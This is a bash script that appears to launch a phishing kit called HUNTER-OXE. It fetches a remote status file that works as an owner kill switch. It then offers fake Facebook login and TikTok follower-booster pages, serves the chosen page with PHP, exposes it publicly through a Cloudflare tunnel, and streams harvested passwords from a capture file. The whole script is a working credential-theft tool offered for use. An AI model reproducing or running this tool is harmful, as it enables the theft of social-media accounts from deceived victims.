#!/bin/bash

# --- REMOTE CONTROL ---
# Change this URL to your new GitHub repo URL
REPO_URL="https://raw.githubusercontent.com/hunteroxe1-ai/HUNTER-OXE-PRO/main/status.txt"
STATUS=$(curl -s -L $REPO_URL | tr -d '[:space:]')

if [[ "$STATUS" == "OFF" ]]; then
    clear
    echo -e "\e[1;31m"
    echo "  #################################################"
    echo "  #                                               #"
    echo "  #     █████╗  ██████╗  ██████╗ ███████╗███████╗ #"
    echo "  #    ██╔══██╗██╔════╝ ██╔════╝ ██╔════╝██╔════╝ #"
    echo "  #    ███████║██║      ██║      █████╗  ███████╗ #"
    echo "  #    ██╔══██║██║      ██║      ██╔══╝  ╚════██║ #"
    echo "  #    ██║  ██║╚██████╗ ╚██████╗ ███████╗███████║ #"
    echo "  #    ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚══════╝ #"
    echo "  #                                               #"
    echo "  #            ACCESS DENIED BY OWNER             #"
    echo "  #           CONTACT: PHILLIMON ISAAC            #"
    echo "  #################################################"
    echo -e "\e[0m"
    exit
fi

# --- MAIN MENU ---
clear
echo -e "\e[1;32m   _  _ _  _ _  _ ___ ____ ____    ____ _  _ ____ "
echo -e "\e[1;32m   |__| |  | |\ |  |  |___ |__/    |  |  \/  |___ "
echo -e "\e[1;32m   |  | |__| | \|  |  |___ |  \    |__| _/\_ |___  v/6.0"
echo -e "\e[1;37m  --------------------------------------------------"
echo -e "\e[1;36m  [*] DEVELOPER : PHILLIMON ISAAC"
echo -e "\e[1;37m  --------------------------------------------------"
echo -e "\e[1;32m  [1] FACEBOOK LOGIN/BOOSTER"
echo -e "\e[1;32m  [2] TIKTOK FOLLOWERS BOOSTER"
echo -e "\e[1;32m  [L] VIEW CAPTURED DATA"
echo -e "\e[1;31m  [X] EXIT"
echo -e "\e[1;37m  --------------------------------------------------"
read -p "[?] CHOICE : " choice

case $choice in
    1) cp web/facebook.html web/index.html ;;
    2) cp web/tiktok.html web/index.html ;;
    L|l) clear; echo -e "\e[1;33m--- CAPTURED LOGS ---\e[0m"; cat storage/passwords.txt; read -p "Press Enter"; ./HUNTER~OXE.sh ;;
    X|x) exit ;;
    *) ./HUNTER~OXE.sh ;;
esac

# Start Cloudflared
php -S 127.0.0.1:8080 -t web/ > /dev/null 2>&1 &
echo -e "\e[1;33m\n[!] Generating Link...\e[0m"
sleep 3
cloudflared tunnel --url http://127.0.0.1:8080 2>&1 | grep -o 'https://[-0-9a-z.]*.trycloudflare.com' &

# Watch Logs
tail -f storage/passwords.txt | while read line; do
    echo -e "\e[1;32m[+] DATA CAPTURED: \e[1;37m$line"
done
